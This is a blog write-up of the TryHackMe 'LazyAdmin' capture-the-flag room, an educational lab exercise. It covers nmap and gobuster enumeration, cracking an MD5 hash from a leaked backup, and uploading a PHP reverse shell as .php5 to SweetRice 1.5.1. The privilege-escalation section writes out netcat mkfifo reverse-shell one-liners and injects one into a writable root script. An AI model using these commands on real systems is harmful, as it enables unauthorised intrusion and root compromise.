---
layout: post
current: post
cover: 'assets/images/lazyadmin/cover.png'
navigation: True
title: "Lazy Admin Write Up"
date: 2021-05-05 00:00:00
tags: [tryhackme, ctf, easy]
class: post-template
subclass: 'post'
author: darryn
---
![cover](/assets/images/lazyadmin/cover.png)

### Overview

[lazyadmin](https://tryhackme.com/room/lazyadmin) is a fun easy rated CTF room on [TryHackMe](https://tryhackme.com). 

### Nmap

I deployed the machine and was given the target IP 10.10.86.223. I started a NMAP scan to check the available ports. 

```highlight
└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.86.223
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-05 16:22 BST
Nmap scan report for 10.10.86.223
Host is up (0.028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
```

2 Ports open:

- 22 - SSH - OpenSSH 7.2p2 Ubuntu
- 80 - HTTP - Apache web server version 2.4.18

I also ran a full port scan but no additional ports were found.

### Enumeration

Opening the webpage just provides a default apache page, I checked the source code and tried robots.txt but didn't find anything so ran a gobuster. Straight away I got a hit for '/content'.

```highlight
└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.86.223 -t 75 -o gobuster.log
===============================================================                                                                
Gobuster v3.0.1                                                                                                                
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                
===============================================================
[+] Url:            http://10.10.86.223
[+] Threads:        75
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/05/05 16:26:03 Starting gobuster
===============================================================
/content (Status: 301)
[SNIP]
```

Navigating to 'http://10.10.86.223/content' appears to be another default page but this time revealing the server is running SweetRice CMS. 

![webpage](/assets/images/lazyadmin/webpage.png)

I ran a gobuster in the background while clicking around. I didnt find anything of interest, however gobuster found a few directories to review.

```highlight
└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.86.223/content/ -t 75 -o gobuster-sweetrice.log
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.86.223/content/
[+] Threads:        75
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/05/05 16:33:33 Starting gobuster
===============================================================
/images (Status: 301)
/js (Status: 301)
/inc (Status: 301)
/as (Status: 301)
/_themes (Status: 301)
/attachment (Status: 301)
===============================================================
2021/05/05 16:35:02 Finished
===============================================================
```

'http://10.10.86.223/content/as' took me to a login page, I tried some default credentials but couldnt log in. Looking around the folders '/inc/mysql_backup/' looks interesting and in the folder is a single backup file.

![mysql](/assets/images/lazyadmin/mysql.png)

The file is readable with cat, looking through I found a user account and password hash. Using the tool 'hash-identifier' the hash is md5. Because its md5 I used [crackstation](https://crackstation.net) rather than hashcat and got a hit.

Using the credentials from the mysql backup file and the cracked password I was able to login to 'http://10.10.86.223/content/as'

![sweetrice](/assets/images/lazyadmin/sweetrice.png)

### Initial Access

Once logged in, I could clearly see the SweetRice version of 1.5.1, googling 'sweetrice 1.5.1 exploit' I found an [exploit](https://www.exploit-db.com/exploits/40716) using the upload feature. The exploit is just a simple python script doing a POST call to '/as/?type=media_center&mode=upload'.

Rather than use the exploit code I navigated to the 'Media Center' part of the website so I could upload a file.

I copied a php reverse shell from /usr/share/webshells/php from my ParrotOS and renamed to shell.php and updated the IP and port details.

![upload](/assets/images/lazyadmin/upload.png)

However, shell.php didn't work, I didn't get an error it just didn't upload, I renamed to shell.php5 and tried to upload again and it worked. I clicked the uploaded file and got a shell.


```highlight
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [SNIP] from (UNKNOWN) [10.10.86.223] 38212
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 18:52:05 up 33 min,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### Priv Esc

The first thing I checked was sudo -l and found the www-data was able to run a perl script as sudo with no password. 

```highlight
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ 
```

I checked the script permissions and I was not able to edit the script however I could read it.

```highlight
$ ls -lah /home/itguy/backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
```

I stabilised my shell using python and started reviewing the script. It looks like the script calls another script so I again checked the permissions and I can edit this file.

```highlight
www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
www-data@THM-Chal:/home/itguy$
www-data@THM-Chal:/home/itguy$ ls -lah /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
www-data@THM-Chal:/home/itguy$
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

The /etc/copy.sh script has a nc reverse shell payload, I replaced the command with my own IP and port details  and ran the perl script as sudo.

```highlight
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 5555 >/tmp/f" > /etc/copy.sh
www-data@THM-Chal:/home/itguy$
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
```

Root shell!

```highlight
└──╼ $nc -nvlp 5555
listening on [any] 5555 ...
connect to [SNIP] from (UNKNOWN) [10.10.86.223] 49536
# id
uid=0(root) gid=0(root) groups=0(root)
```

Thanks for reading!

